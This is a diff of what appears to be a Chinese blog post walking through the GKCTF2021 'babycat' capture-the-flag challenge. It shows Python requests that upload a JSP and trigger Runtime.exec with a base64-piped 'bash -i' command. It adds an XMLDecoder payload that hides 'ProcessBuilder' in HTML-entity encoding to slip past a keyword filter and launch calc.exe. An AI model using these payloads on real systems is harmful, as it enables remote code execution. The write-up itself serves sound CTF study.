@@ -88,7 +88,7 @@
             <h1>GKCTF2021 babycat</h1>
             <span class="meta">
             	Posted on
-              2021-06-28，5 min read
+              2021-06-28，6 min read
             </span>
           </div>
         </div>
@@ -186,6 +186,25 @@ requests.post(url+&quot;/home/upload&quot;,headers=headers,files=files)
 requests.post(url+&quot;/register&quot;,headers=headers,data=data)
 requests.post(url+&quot;/static/GUOKE.jsp&quot;,data={&quot;guoke&quot;:&quot;function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec(\&quot;bash -c {echo,
 }|{base64,-d}|{bash,-i}\&quot;)&quot;})
+</code></pre>
+<p>同样的。xml会自动解析html实体编码。可以绕过关键字</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;java&gt;
+    &lt;object class=&quot;java.lang.&amp;#80;rocessBuilder&quot;&gt;
+        &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;
+            &lt;void index=&quot;0&quot;&gt;
+                &lt;string&gt;cmd.exe&lt;/string&gt;
+            &lt;/void&gt;
+            &lt;void index=&quot;1&quot;&gt;
+                &lt;string&gt;/c&lt;/string&gt;
+            &lt;/void&gt;
+            &lt;void index=&quot;2&quot;&gt;
+                &lt;string&gt;calc.exe&lt;/string&gt;
+            &lt;/void&gt;
+        &lt;/array&gt;
+        &lt;void method=&quot;start&quot;/&gt;
+    &lt;/object&gt;
+&lt;/java&gt;
 </code></pre>
 
           
